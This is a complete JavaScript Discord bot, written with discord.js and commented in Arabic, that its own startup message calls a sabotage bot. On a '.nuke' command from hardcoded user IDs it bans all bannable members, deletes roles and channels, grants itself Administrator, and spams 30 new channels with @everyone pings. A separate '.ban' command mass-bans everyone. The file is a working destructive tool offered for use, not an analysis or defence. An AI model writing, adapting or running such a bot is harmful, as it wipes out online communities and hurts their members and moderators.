// language: JavaScript, file: nuke_bot.js
// deps: discord.js
const { Client, GatewayIntentBits, PermissionFlagsBits, ChannelType } = require('discord.js');

// التوكن والايدي (لو إنت بتستخدم .env هيسحب منه أوتوماتيك)
require('dotenv').config();
const token = process.env.TOKEN || process.env.DISCORD_TOKEN || 'التوكن_بتاعك_هنا';

// حط الايدي بتاعك هنا
const allowedUsers = ['1342238662368296980', '1557735350464417822'];

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent // مهم جداً عشان يقرأ الأوامر
    ]
});

client.on('ready', () => {
    console.log(`✅ بوت التخريب شغال كـ ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.guild) return;
    
    // التحقق إن الشخص ده مسموح له
    if (!allowedUsers.includes(message.author.id)) return;

    const content = message.content.toLowerCase();

    // ==========================================
    // أمر .nuke (تخريب شامل)
    // ==========================================
    if (content === '.nuke') {
        await message.reply('💀 NUKE STARTED').catch(() => {});
        const guild = message.guild;

        try {
            // 1. حظر الأعضاء
            const members = await guild.members.fetch();
            for (const [id, member] of members) {
                if (id === client.user.id || id === message.author.id) continue;
                if (member.bannable) {
                    await member.ban({ reason: 'Nuke', deleteMessageSeconds: 0 }).catch(() => {});
                }
                await new Promise(r => setTimeout(r, 150));
            }

            // 2. مسح الرولات
            const roles = await guild.roles.fetch();
            for (const [id, role] of roles) {
                if (id === guild.id || !role.editable) continue;
                if (role.members.has(client.user.id)) {
                    await role.setPermissions([PermissionFlagsBits.Administrator]).catch(() => {});
                } else {
                    await role.delete('Nuke').catch(() => {});
                }
                await new Promise(r => setTimeout(r, 150));
            }

            // 3. مسح القنوات
            const channels = await guild.channels.fetch();
            for (const [id, channel] of channels) {
                await channel.delete('Nuke').catch(() => {});
                await new Promise(r => setTimeout(r, 150));
            }

            // 4. سبام قنوات
            for (let i = 0; i < 30; i++) {
                const newCh = await guild.channels.create({
                    name: `NUKED-${i}`,
                    type: ChannelType.GuildText
                }).catch(() => null);
                
                if (newCh) {
                    await newCh.send('@everyone @here NUKED 💀').catch(() => {});
                }
            }
        } catch (e) {}
    }

    // ==========================================
    // أمر .ban (حظر الكل)
    // ==========================================
    if (content === '.ban') {
        await message.reply('🔨 BANNING EVERYONE').catch(() => {});
        const guild = message.guild;

        try {
            const members = await guild.members.fetch();
            for (const [id, member] of members) {
                if (id === client.user.id || id === message.author.id) continue;
                if (member.bannable) {
                    await member.ban({ reason: 'Mass Ban', deleteMessageSeconds: 0 }).catch(() => {});
                }
                await new Promise(r => setTimeout(r, 150));
            }
        } catch (e) {}
    }
});

client.login(token);